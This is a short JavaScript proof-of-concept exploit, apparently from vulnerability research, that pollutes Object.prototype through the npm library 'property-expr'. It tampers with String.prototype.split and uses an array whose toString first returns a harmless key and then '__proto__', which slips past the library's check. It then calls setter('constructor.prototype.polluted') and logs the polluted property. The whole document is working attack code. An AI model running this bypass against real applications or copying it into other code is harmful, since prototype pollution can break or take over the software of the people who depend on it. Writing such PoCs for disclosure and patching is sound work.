var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
let expr = require('property-expr');
obj = {};
console.log({}.polluted);
expr.setter('constructor.prototype.polluted')(obj, 'yes');
console.log({}.polluted);